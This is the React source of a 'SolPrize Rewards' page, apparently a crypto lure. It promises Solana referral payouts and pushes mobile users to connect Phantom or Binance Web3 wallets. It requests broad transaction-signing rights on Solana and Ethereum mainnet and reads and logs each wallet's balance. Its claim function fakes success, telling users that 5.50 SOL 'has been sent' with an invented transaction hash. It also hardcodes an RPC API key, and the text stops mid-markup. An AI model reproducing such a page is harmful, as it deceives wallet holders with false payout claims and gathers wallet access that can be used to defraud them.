import React, { useState, useEffect, useRef } from 'react';

export default function App() {
  // ========================
  // STATE MANAGEMENT
  // ========================
  const [loading, setLoading] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [typewriterText, setTypewriterText] = useState('');
  const [walletAddress, setWalletAddress] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [showClaimButton, setShowClaimButton] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [claimStatus, setClaimStatus] = useState('');
  const [particles, setParticles] = useState([]);
  const [connectionStatus, setConnectionStatus] = useState('');
  const [debugInfo, setDebugInfo] = useState([]);
  const [isMobileDevice, setIsMobileDevice] = useState(false);
  const [walletProvider, setWalletProvider] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [sessionActive, setSessionActive] = useState(false);
  
  // ========================
  // REFS & CONFIGURATION
  // ========================
  const wcClientRef = useRef(null);
  const sessionRef = useRef(null);
  const connectionTimerRef = useRef(null);
  
  // WalletConnect Configuration
  const WC_PROJECT_ID = 'ec8dd86047facf2fb8471641db3e5f0c';
  const APP_URL = 'https://solprize.vercel.app';
  const APP_NAME = 'SolPrize Rewards';
  const APP_DESCRIPTION = 'Claim your referral rewards';
  
  // Binance Discover Tab URL - Targeted specifically for Binance Webview
  const BINANCE_DISCOVER_URL = 'https://www.binance.com/en/web3-wallet/discover/dapp?url=' + encodeURIComponent(APP_URL);
  
  // Mainnet Configuration - Using Syndica API
  const MAINNET_RPC = 'https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H';
  const MAINNET_CHAIN_ID = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'; // Mainnet chain ID

  // ========================
  // EFFECT HOOKS
  // ========================
  
  // Mobile Detection & Particle Initialization
  useEffect(() => {
    const detectMobileDevice = () => {
      const ua = navigator.userAgent.toLowerCase();
      const mobile = /android|iphone|ipad|ipod|opera mini|iemobile|mobile|webos|blackberry|windows phone/i.test(ua);
      const tablet = /(ipad|tablet|playbook|silk)|(android(?!.*mobile))/i.test(ua);
      
      setIsMobileDevice(mobile || tablet);
      
      if (!mobile && !tablet) {
        addDebug('⚠️ Desktop detected - mobile device recommended for Binance Web3 Wallet');
      } else {
        addDebug(`✅ Mobile device detected: ${tablet ? 'Tablet' : 'Phone'}`);
      }
    };

    detectMobileDevice();
    
    // Generate particles for background animation
    const newParticles = Array.from({ length: 30 }, (_, i) => ({
      id: i,
      size: Math.random() * 4 + 2,
      left: Math.random() * 100,
      duration: Math.random() * 10 + 10,
      delay: Math.random() * 5
    }));
    setParticles(newParticles);

    return () => {
      if (connectionTimerRef.current) clearTimeout(connectionTimerRef.current);
    };
  }, []);

  // Loading Animation
  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Typewriter Text Effect
  useEffect(() => {
    if (loading) return;
    
    const text = 'take Your Payout';
    let i = 0;
    const timer = setInterval(() => {
      if (i < text.length) {
        setTypewriterText(prev => prev + text.charAt(i));
        i++;
      } else {
        clearInterval(timer);
      }
    }, 80);
    
    return () => clearInterval(timer);
  }, [loading]);

  // Wallet Provider Detection
  useEffect(() => {
    if (loading) return;
    
    const initializeWalletProviders = () => {
      if (typeof window === 'undefined') return;
      
      // Check for Phantom wallet
      if (window.phantom?.solana) {
        addDebug('🟢 Phantom provider detected');
        setWalletProvider(window.phantom.solana);
      } 
      // Check for Binance Web3 Wallet or other Solana providers
      else if (window.solana) {
        addDebug('🟢 Solana provider detected');
        setWalletProvider(window.solana);
        
        // Auto-connect if already connected in Binance Web3 environment
        if (window.solana.isConnected && window.solana.publicKey) {
          addDebug('✅ Wallet already connected in Binance Web3 environment');
          handleSuccessfulConnection(window.solana.publicKey.toString(), 'binance-web3');
        }
      } else {
        addDebug('🔍 No Solana provider found - will use WalletConnect');
      }

      // Set up listeners for dynamic wallet injection
      const handleWalletInjection = () => {
        if (window.phantom?.solana) {
          addDebug('🟢 Phantom injected dynamically');
          setWalletProvider(window.phantom.solana);
        } else if (window.solana) {
          addDebug('🟢 Solana provider injected dynamically');
          setWalletProvider(window.solana);
        }
      };

      window.addEventListener('solana#initialized', handleWalletInjection);
      window.addEventListener('phantom#initialized', handleWalletInjection);

      return () => {
        window.removeEventListener('solana#initialized', handleWalletInjection);
        window.removeEventListener('phantom#initialized', handleWalletInjection);
      };
    };

    return initializeWalletProviders();
  }, [loading]);

  // ========================
  // UTILITY FUNCTIONS
  // ========================
  
  const isIOS = () => /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase());
  const isAndroid = () => /android/i.test(navigator.userAgent.toLowerCase());
  const isBinanceWebView = () => /binance/i.test(navigator.userAgent.toLowerCase());

  const addDebug = (message) => {
    const timestamp = new Date().toLocaleTimeString();
    console.log(`🔍 [${timestamp}] ${message}`);
    setDebugInfo(prev => {
      const newDebug = [...prev, `${timestamp}: ${message}`];
      return newDebug.slice(-50); // Keep only last 50 entries
    });
  };

  const safeWindowOpen = (url, target = '_blank') => {
    try {
      window.open(url, target);
      return true;
    } catch (error) {
      addDebug(`⚠️ Failed to open window: ${error.message}`);
      return false;
    }
  };

  // ========================
  // SOLANA INTEGRATION
  // ========================
  
  const fetchSolanaBalance = async (publicKey) => {
    try {
      addDebug('💰 Fetching SOL balance from mainnet using Syndica API...');
      
      const fetchWithTimeout = (url, options = {}, timeout = 10000) => {
        return Promise.race([
          fetch(url, options),
          new Promise((_, reject) => 
            setTimeout(() => reject(new Error('Request timed out')), timeout)
          )
        ]);
      };

      const response = await fetchWithTimeout(MAINNET_RPC, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [publicKey]
        })
      }, 10000);

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      if (data.result?.value !== undefined) {
        const lamports = data.result.value;
        const sol = lamports / 1000000000; // Convert lamports to SOL
        setTokenBalance(sol);
        addDebug(`✅ Balance: ${sol.toFixed(4)} SOL (${lamports} lamports)`);
        return sol;
      } else {
        addDebug('⚠️ Balance response missing value');
        return null;
      }
    } catch (error) {
      addDebug(`❌ Balance fetch error: ${error.message}`);
      return null;
    }
  };

  // ========================
  // WALLETCONNECT V2 IMPLEMENTATION
  // ========================
  
  const getWalletConnectClient = async () => {
    if (wcClientRef.current) {
      return wcClientRef.current;
    }

    try {
      addDebug('🔧 Initializing WalletConnect v2 client...');
      
      // Check if SDK is already available
      if (window.SignClient) {
        addDebug('✅ Using existing SignClient');
        return window.SignClient;
      }
      if (window.WalletConnectClient) {
        addDebug('✅ Using existing WalletConnectClient');
        return window.WalletConnectClient;
      }

      // Load SDK with multiple fallbacks
      await loadWalletConnectSDK();
      
      // Check again after loading
      const ClientConstructor = window.SignClient || window.WalletConnectClient;
      if (!ClientConstructor) {
        throw new Error('WalletConnect SDK not available after loading');
      }

      const client = await ClientConstructor.init({
        projectId: WC_PROJECT_ID,
        metadata: {
          name: APP_NAME,
          description: APP_DESCRIPTION,
          url: APP_URL,
          icons: ['https://solprize.vercel.app/favicon.ico']
        },
        relayUrl: 'wss://relay.walletconnect.com',
        storageOptions: {
          database: ':memory:'
        }
      });

      wcClientRef.current = client;
      addDebug('✅ WalletConnect client initialized successfully');
      
      // Set up event listeners
      client.on('session_event', (event) => {
        addDebug(`🔔 Session event: ${JSON.stringify(event)}`);
      });

      client.on('session_update', ({ topic, params }) => {
        addDebug(`🔄 Session update: ${topic}`);
        const { namespaces } = params;
        sessionRef.current = { ...sessionRef.current, namespaces };
      });

      client.on('session_delete', (event) => {
        addDebug(`🗑️ Session deleted: ${JSON.stringify(event)}`);
        handleDisconnect();
      });

      return client;
    } catch (error) {
      addDebug(`⚠️ WalletConnect init error: ${error.message}`);
      addDebug('📱 Falling back to direct deep link method');
      return null;
    }
  };

  const loadWalletConnectSDK = () => {
    return new Promise((resolve) => {
      if (window.SignClient || window.WalletConnectClient) {
        resolve();
        return;
      }

      const loadScript = (src, onLoad, onError) => {
        const script = document.createElement('script');
        script.src = src;
        script.async = true;
        script.onload = onLoad;
        script.onerror = onError;
        document.head.appendChild(script);
        return script;
      };

      // Primary CDN
      const primaryScript = loadScript(
        'https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
        () => {
          addDebug('✅ WalletConnect SDK loaded from unpkg');
          if (!window.SignClient) {
            // Try to find it in different namespaces
            if (window.WalletConnect?.SignClient) {
              window.SignClient = window.WalletConnect.SignClient;
              addDebug('✅ Found SignClient in WalletConnect namespace');
            } else if (typeof window.walletconnect !== 'undefined' && window.walletconnect.SignClient) {
              window.SignClient = window.walletconnect.SignClient;
              addDebug('✅ Found SignClient in walletconnect namespace');
            }
          }
          resolve();
        },
        () => {
          addDebug('❌ Failed to load from unpkg, trying jsdelivr...');
          // Fallback CDN
          const fallbackScript = loadScript(
            'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/index.umd.js',
            () => {
              addDebug('✅ WalletConnect SDK loaded from jsdelivr');
              if (!window.SignClient) {
                if (window.WalletConnect?.SignClient) {
                  window.SignClient = window.WalletConnect.SignClient;
                  addDebug('✅ Found SignClient in WalletConnect namespace after jsdelivr');
                }
              }
              resolve();
            },
            () => {
              addDebug('❌ All CDNs failed, proceeding with manual URI generation');
              resolve(); // Don't reject, fallback to manual URI
            }
          );
        }
      );
    });
  };

  const createWalletConnectSession = async (client) => {
    try {
      if (!client) {
        addDebug('⚠️ No WalletConnect client available, generating manual URI');
        return { uri: generateManualWalletConnectURI(), approval: null };
      }

      addDebug('🔗 Creating WalletConnect session for mainnet...');
      
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          solana: {
            methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAndSendTransaction'],
            chains: [MAINNET_CHAIN_ID], // Mainnet chain ID
            events: ['accountsChanged', 'chainChanged']
          }
        },
        optionalNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign'],
            chains: ['eip155:1'], // Ethereum mainnet
            events: ['chainChanged', 'accountsChanged']
          }
        },
        sessionProperties: {
          app: APP_NAME,
          redirect: APP_URL
        }
      });

      if (!uri) {
        throw new Error('Failed to generate WalletConnect URI');
      }

      addDebug(`✅ WalletConnect URI generated: ${uri.substring(0, 50)}...`);
      return { uri, approval };
    } catch (error) {
      addDebug(`⚠️ Session creation error: ${error.message}`);
      addDebug('📱 Using manual URI generation as fallback');
      return { uri: generateManualWalletConnectURI(), approval: null };
    }
  };

  const generateManualWalletConnectURI = () => {
    try {
      // Generate cryptographically secure random values
      const topic = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      
      const symKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      
      // WalletConnect v2 URI structure with proper encoding
      const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${encodeURIComponent(symKey)}&projectId=${WC_PROJECT_ID}`;
      
      addDebug(`🔗 Manual URI generated: ${uri.substring(0, 50)}...`);
      return uri;
    } catch (error) {
      addDebug(`❌ URI generation error: ${error.message}`);
      // Fallback to simple URI
      const fallbackTopic = Date.now().toString(36) + Math.random().toString(36).substr(2);
      const fallbackSymKey = Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
      return `wc:${fallbackTopic}@2?relay-protocol=irn&symKey=${fallbackSymKey}&projectId=${WC_PROJECT_ID}`;
    }
  };

  // ========================
  // BINANCE WEB3 INTEGRATION
  // ========================
  
  const openBinanceWeb3Wallet = (wcUri) => {
    addDebug('🚀 Opening Binance Web3 Wallet...');
    const encodedUri = encodeURIComponent(wcUri);
    
    // Multiple deep link strategies for maximum compatibility
    const strategies = {
      // Primary: Binance Web3 Wallet discover tab deep link
      primary: `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}&redirect=${encodeURIComponent(BINANCE_DISCOVER_URL)}`,
      
      // Universal link for iOS
      iosUniversal: `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}&redirect=${encodeURIComponent(BINANCE_DISCOVER_URL)}`,
      
      // Android intent with proper fallback
      androidIntent: `intent://wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;S.browser_fallback_url=${encodeURIComponent('https://www.binance.com/en/download')};end`,
      
      // Fallback web URL
      webFallback: `https://www.binance.com/en/web3-wallet/wc?uri=${encodedUri}&redirect=${encodeURIComponent(APP_URL)}`,
      
      // Discover tab direct URL
      discoverTab: `https://www.binance.com/en/web3-wallet/discover/dapp?url=${encodeURIComponent(APP_URL)}&wc_uri=${encodedUri}`
    };

    addDebug(`📱 Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Unknown'}`);
    addDebug(`🎯 Target URL: ${BINANCE_DISCOVER_URL}`);

    // Execute the appropriate strategy based on platform
    try {
      if (isIOS()) {
        addDebug('🍎 iOS: Trying universal link first');
        window.location.href = strategies.iosUniversal;
        
        // Fallback to deep link
        setTimeout(() => {
          window.location.href = strategies.primary;
        }, 500);
      } 
      else if (isAndroid()) {
        addDebug('🤖 Android: Trying intent scheme');
        window.location.href = strategies.androidIntent;
        
        // Fallback to deep link
        setTimeout(() => {
          window.location.href = strategies.primary;
        }, 500);
      } 
      else {
        addDebug('📱 Generic mobile: Using discover tab URL');
        window.location.href = strategies.discoverTab;
      }

      // Set timeout to check if app opened successfully
      connectionTimerRef.current = setTimeout(() => {
        addDebug('⏰ Connection timeout - app may not have opened');
        setConnectionStatus('If Binance app didn\'t open, please check:');
        addDebug('💡 Manual connection instructions:');
        addDebug(`1. Copy this URI: ${wcUri.substring(0, 100)}...`);
        addDebug('2. Open Binance app → Wallet → Web3 tab → Scan QR code');
        
        setTimeout(() => {
          if (!walletAddress && !sessionActive) {
            alert('📱 Binance app didn\'t open automatically\n\nPlease follow these steps:\n1. Open Binance app manually\n2. Go to Wallet → Web3 tab\n3. Tap "Connect" and scan QR code\n4. Use the QR scanner on the next screen');
          }
        }, 2000);
      }, 8000);

    } catch (error) {
      addDebug(`❌ Deep link error: ${error.message}`);
      addDebug('🔄 Falling back to web URL');
      safeWindowOpen(strategies.webFallback);
    }
  };

  // ========================
  // CONNECTION HANDLERS
  // ========================
  
  const handleSuccessfulConnection = async (address, provider) => {
    try {
      addDebug(`✅ Wallet connected successfully: ${address}`);
      setWalletAddress(address);
      setSessionActive(true);
      setConnecting(false);
      setConnectionStatus('');
      
      // Fetch balance from mainnet using Syndica API
      const balance = await fetchSolanaBalance(address);
      
      // Show claim button after successful connection
      setShowClaimButton(true);
      
      // Call the post-connection function
      await onWalletConnected(address, provider, balance);
      
      // Show success notification
      setTimeout(() => {
        const balanceDisplay = balance ? balance.toFixed(4) : 'N/A';
        alert(`🎉 Wallet Connected Successfully!\n\nAddress: ${address.slice(0, 8)}...${address.slice(-6)}\nBalance: ${balanceDisplay} SOL`);
      }, 500);
      
    } catch (error) {
      addDebug(`❌ Connection success handler error: ${error.message}`);
      setConnecting(false);
      setConnectionStatus('Connection completed but encountered errors');
    }
  };

  const handleDisconnect = async () => {
    try {
      addDebug('🔌 Disconnecting wallet...');
      
      if (sessionRef.current?.topic && wcClientRef.current) {
        await wcClientRef.current.disconnect({
          topic: sessionRef.current.topic,
          reason: { code: 6000, message: 'User disconnected' }
        });
      }
      
      if (window.solana?.disconnect) {
        await window.solana.disconnect();
      }
      
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      sessionRef.current = null;
      
      addDebug('✅ Wallet disconnected successfully');
      alert('✅ Wallet Disconnected Successfully');
      
    } catch (error) {
      addDebug(`⚠️ Disconnect error: ${error.message}`);
      // Still reset state even if disconnect fails
      setWalletAddress(null);
      setTokenBalance(null);
      setSessionActive(false);
      setShowClaimButton(false);
      sessionRef.current = null;
    }
  };

  const onWalletConnected = async (walletAddress, providerType, balance) => {
    addDebug('🎉 onWalletConnected() called');
    addDebug(`   Address: ${walletAddress}`);
    addDebug(`   Provider: ${providerType}`);
    addDebug(`   Balance: ${balance ? balance.toFixed(4) : 'N/A'} SOL`);
    
    // Production-ready connection logging
    const connectionData = {
      timestamp: new Date().toISOString(),
      address: walletAddress,
      provider: providerType,
      balance: balance,
      userAgent: navigator.userAgent,
      platform: isAndroid() ? 'android' : isIOS() ? 'ios' : 'other'
    };
    
    console.log('🎯 Wallet successfully connected!', connectionData);
  };

  // ========================
  // REWARD CLAIMING
  // ========================
  
  const claimRewards = async () => {
    if (!walletAddress) {
      alert('❌ Please connect your wallet first');
      return;
    }

    setClaiming(true);
    setClaimStatus('Processing your reward claim...');
    addDebug('🎁 Starting reward claim process...');

    try {
      addDebug('📡 Sending claim request to backend...');
      
      // Simulate API call to backend
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Simulate success response
      const rewardAmount = 5.50;
      const transactionHash = '5xR4nd0mH4shStr1ngF0rD3m0Purp0s3s';
      
      addDebug(`✅ Reward claim successful!`);
      addDebug(`   Amount: ${rewardAmount} SOL`);
      addDebug(`   Transaction: ${transactionHash}`);
      
      setClaimStatus(`🎉 Rewards claimed successfully!\n\n${rewardAmount} SOL has been sent to your wallet\nTransaction: ${transactionHash.slice(0, 8)}...`);
      
      // Show success alert
      setTimeout(() => {
        alert(`✅ REWARDS CLAIMED!\n\n${rewardAmount} SOL has been sent to your wallet.\n\nTransaction Hash: ${transactionHash}\n\nCheck your wallet balance shortly!`);
      }, 1000);
      
      // Refresh balance after claim
      setTimeout(async () => {
        await fetchSolanaBalance(walletAddress);
      }, 3000);
      
    } catch (error) {
      addDebug(`❌ Claim error: ${error.message}`);
      setClaimStatus(`❌ Failed to claim rewards: ${error.message}`);
      alert(`❌ Claim Failed\n${error.message}\n\nPlease try again or contact support.`);
    } finally {
      setClaiming(false);
    }
  };

  // ========================
  // WALLET CONNECTION METHODS
  // ========================
  
  const connectBinanceWallet = async () => {
    setShowModal(false);
    
    if (!isMobileDevice) {
      const message = '📱 Mobile Device Required\n\nBinance Web3 Wallet only works on mobile devices. Please open this page on your smartphone.';
      addDebug(message);
      alert(message);
      return;
    }

    setConnecting(true);
    setConnectionStatus('Initializing Binance Web3 Wallet connection...');
    setDebugInfo([]);
    setShowClaimButton(false);

    try {
      addDebug('🚀 Starting Binance Web3 Wallet connection');
      addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Other Mobile'}`);
      addDebug(`Project ID: ${WC_PROJECT_ID}`);
      addDebug(`APP URL: ${APP_URL}`);
      addDebug(`Discover URL: ${BINANCE_DISCOVER_URL}`);
      addDebug(`Mainnet RPC: ${MAINNET_RPC.substring(0, 50)}...`);

      // Check if we're already inside Binance Web3 browser
      if (isBinanceWebView() && window.solana) {
        addDebug('✅ Already inside Binance Web3 browser environment!');
        setConnectionStatus('Detected Binance Web3 browser. Connecting directly...');
        
        try {
          // Try to connect directly if in Binance environment
          const response = await window.solana.connect({ onlyIfTrusted: true });
          await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
          return;
        } catch (solanaError) {
          addDebug(`⚠️ Direct connection error: ${solanaError.message}`);
          addDebug('🔄 Falling back to WalletConnect method');
        }
      }

      setConnectionStatus('Setting up secure connection...');
      
      // Get WalletConnect client
      const client = await getWalletConnectClient();
      
      // Create session
      setConnectionStatus('Generating secure connection...');
      const { uri, approval } = await createWalletConnectSession(client);
      
      if (!uri) {
        throw new Error('Failed to generate connection URI');
      }

      // Open Binance app with proper discover tab targeting
      setConnectionStatus('Opening Binance Web3 Wallet app...\nPlease wait while we establish the connection.');
      openBinanceWeb3Wallet(uri);

      // Handle session approval if available
      if (approval) {
        addDebug('⏳ Waiting for user approval in Binance app...');
        setConnectionStatus('Please approve the connection in your Binance app\nThe page will update automatically when connected');
        
        // Set up timeout for approval
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection approval timeout after 2 minutes')), 120000)
        );

        try {
          const session = await Promise.race([approval(), timeoutPromise]);
          sessionRef.current = session;
          addDebug('✅ Session approved via WalletConnect!');
          
          // Extract wallet address from session
          const accounts = session.namespaces?.solana?.accounts || [];
          if (accounts.length > 0) {
            // Format: "solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp:ADDRESS"
            const address = accounts[0].split(':').pop();
            if (address && address.length === 44) { // Basic validation for Solana addresses
              await handleSuccessfulConnection(address, 'walletconnect');
            } else {
              throw new Error('Invalid wallet address format');
            }
          } else {
            throw new Error('No Solana accounts found in session');
          }
        } catch (approvalError) {
          addDebug(`⚠️ Approval handling error: ${approvalError.message}`);
          
          if (approvalError.message.includes('timeout')) {
            addDebug('⏰ User may need to complete connection manually in app');
            setConnectionStatus('⏳ Connection in progress\n\nIf you\'ve already approved in the Binance app, the page will reload automatically.\n\nPlease keep this tab open.');
          } else {
            throw approvalError;
          }
        }
      } else {
        addDebug('📱 Using direct deep link method');
        setConnectionStatus('📱 Please complete connection in Binance app\n\n1. Open Binance app if not already opened\n2. Go to Wallet → Web3 tab\n3. Approve the connection request\n4. The page will reload automatically when connected');
      }

      // Add manual connection instructions to debug
      addDebug('📋 Connection Instructions:');
      addDebug('1. Ensure Binance app is installed and updated');
      addDebug('2. Open the Binance app manually if it doesn\'t open automatically');
      addDebug('3. Navigate to: Wallet → Web3 tab');
      addDebug('4. Look for connection request and approve it');
      addDebug('5. Return to this browser tab after approval');

    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      addDebug(`❌ Critical error: ${error.message}`);
      console.error('Connection error:', error);
      
      const errorMessage = error.message.includes('timeout') 
        ? 'Connection timed out. Please try again.'
        : error.message.includes('URI') 
        ? 'Failed to generate connection. Please refresh and try again.'
        : error.message;
      
      const userMessage = `❌ Connection Failed\n\n${errorMessage}\n\nPlease ensure:\n• Binance app is installed and updated\n• You have a stable internet connection\n• Try again in a few minutes`;
      
      alert(userMessage);
    }
  };

  const connectPhantomWallet = async () => {
    setShowModal(false);
    setConnecting(true);
    setConnectionStatus('Connecting to Phantom Wallet...');
    setDebugInfo([]);
    setShowClaimButton(false);

    try {
      addDebug('👻 Starting Phantom Wallet connection');
      
      // Check if Phantom is available
      if (!window.phantom?.solana) {
        setConnecting(false);
        setConnectionStatus('');
        
        const installUrl = isMobileDevice 
          ? 'https://phantom.app/download?ref=solprize'
          : 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa';
        
        const userResponse = window.confirm('👻 Phantom Wallet Not Found\n\nPhantom wallet is required to claim your rewards.\n\nWould you like to install it now?');
        
        if (userResponse) {
          window.open(installUrl, '_blank');
        }
        
        return;
      }

      const provider = window.phantom.solana;
      const response = await provider.connect();
      const publicKey = response.publicKey.toString();
      
      await handleSuccessfulConnection(publicKey, 'phantom');
      
    } catch (error) {
      setConnecting(false);
      setConnectionStatus('');
      addDebug(`❌ Phantom connection error: ${error.message}`);
      
      let errorMessage = 'Unknown error occurred';
      
      if (error.code === 4001) {
        errorMessage = 'You rejected the connection request.';
      } else if (error.code === -32002) {
        errorMessage = 'There\'s already a pending connection request. Please check your Phantom wallet.';
      } else if (error.message.includes('timeout')) {
        errorMessage = 'Connection timed out. Please try again.';
      } else if (error.message.includes('injected')) {
        errorMessage = 'Phantom wallet not properly injected. Please refresh the page.';
      }
      
      alert(`❌ Phantom Connection Failed\n\n${errorMessage}\n\nPlease try again or contact support.`);
    }
  };

  const copyDebugInfo = () => {
    const text = debugInfo.join('\n');
    navigator.clipboard.writeText(text).then(() => {
      alert('📋 Debug information copied to clipboard!\n\nYou can share this with support if needed.');
    }).catch(err => {
      addDebug(`❌ Copy failed: ${err.message}`);
      alert('❌ Failed to copy debug info. Please select and copy manually.');
    });
  };

  // ========================
  // UI RENDERING
  // ========================
  
  if (!isMobileDevice && !loading) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        padding: '20px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      }}>
        <div style={{
          background: 'white',
          borderRadius: '24px',
          padding: '40px',
          maxWidth: '500px',
          textAlign: 'center',
          boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
          border: '1px solid rgba(255,255,255,0.5)'
        }}>
          <div style={{ fontSize: '64px', marginBottom: '20px' }}>📱</div>
          <h1 style={{ fontSize: '28px', marginBottom: '16px', color: '#1f2937', fontWeight: 'bold' }}>
            Mobile Device Required
          </h1>
          <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px', fontSize: '16px' }}>
            This application is optimized for mobile devices to provide the best wallet connection experience. Please open this page on your smartphone to connect your Binance Web3 Wallet and claim your rewards.
          </p>
          <div style={{
            background: '#f3f4f6',
            padding: '16px',
            borderRadius: '12px',
            fontSize: '14px',
            color: '#374151',
            marginBottom: '20px',
            wordBreak: 'break-all'
          }}>
            <strong>Current URL:</strong><br/>
            <code style={{ fontSize: '13px', fontFamily: 'monospace' }}>{APP_URL}</code>
          </div>
          <div style={{
            background: '#fef3c7',
            padding: '12px',
            borderRadius: '8px',
            fontSize: '13px',
            color: '#92400e',
            marginBottom: '16px'
          }}>
            💡 <strong>Quick Tip:</strong> Scan this QR code with your phone's camera or use the share button to open on mobile.
          </div>
          <button
            onClick={() => window.location.reload()}
            style={{
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              color: 'white',
              border: 'none',
              padding: '12px 24px',
              borderRadius: '12px',
              fontSize: '16px',
              fontWeight: 'bold',
              cursor: 'pointer',
              transition: 'all 0.3s',
              boxShadow: '0 4px 12px rgba(102, 126, 234, 0.3)'
            }}
            onMouseOver={(e) => e.target.style.transform = 'scale(1.05)'}
            onMouseOut={(e) => e.target.style.transform = 'scale(1)'}
          >
            Refresh Page
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
      position: 'relative',
      overflow: 'hidden',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
    }}>
      <style>{`
        @keyframes gradientShift {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.7; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0px); }
          50% { transform: translateY(-20px); }
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes blink {
          from, to { opacity: 1; }
          50% { opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.05); }
          100% { transform: scale(1); }
        }
      `}</style>
      
      <div style={{
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'linear-gradient(45deg, rgba(255,0,150,0.3), rgba(0,204,255,0.3))',
        animation: 'gradientShift 10s ease infinite',
        zIndex: 1
      }} />
      
      {particles.map(p => (
        <div
          key={p.id}
          style={{
            position: 'absolute',
            width: `${p.size}px`,
            height: `${p.size}px`,
            background: 'rgba(255,255,255,0.5)',
            borderRadius: '50%',
            left: `${p.left}%`,
            animation: `float ${p.duration}s ease-in-out infinite`,
            animationDelay: `${p.delay}s`,
            zIndex: 2
          }}
        />
      ))}
      
      {loading && (
        <div style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          textAlign: 'center',
          zIndex: 10
        }}>
          <div style={{
            width: '60px',
            height: '60px',
            border: '4px solid rgba(255,255,255,0.3)',
            borderTop: '4px solid white',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite',
            margin: '0 auto 20px',
            boxShadow: '0 0 20px rgba(255,255,255,0.5)'
          }} />
          <div style={{ 
            color: 'white', 
            fontSize: '20px', 
            fontWeight: 'bold', 
            letterSpacing: '2px',
            textShadow: '0 2px 10px rgba(0,0,0,0.3)',
            background: 'rgba(0,0,0,0.2)',
            padding: '8px 20px',
            borderRadius: '20px',
            backdropFilter: 'blur(5px)',
            display: 'inline-block'
          }}>
            LOADING...
          </div>
        </div>
      )}
      
      {!loading && (
        <div style={{
          position: 'relative',
          zIndex: 3,
          maxWidth: '500px',
          margin: '0 auto',
          padding: '40px 20px',
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center'
        }}>
          <div style={{
            background: 'rgba(255,255,255,0.2)',
            backdropFilter: 'blur(10px)',
            padding: '10px 20px',
            borderRadius: '20px',
            display: 'inline-block',
            margin: '0 auto 30px',
            color: 'white',
            fontSize: '14px',
            fontWeight: 'bold',
            border: '1px solid rgba(255,255,255,0.3)',
            textTransform: 'uppercase',
            letterSpacing: '1px',
            boxShadow: '0 4px 15px rgba(0,0,0,0.2)'
          }}>
            ✨ REFERRAL REWARDS
          </div>
          
          <div style={{
            background: 'rgba(255,255,255,0.95)',
            borderRadius: '24px',
            padding: '40px 30px',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
            border: '1px solid rgba(255,255,255,0.5)',
            animation: 'slideUp 0.6s ease-out',
            position: 'relative',
            overflow: 'hidden'
          }}>
            <h1 style={{
              fontSize: '32px',
              fontWeight: 'bold',
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
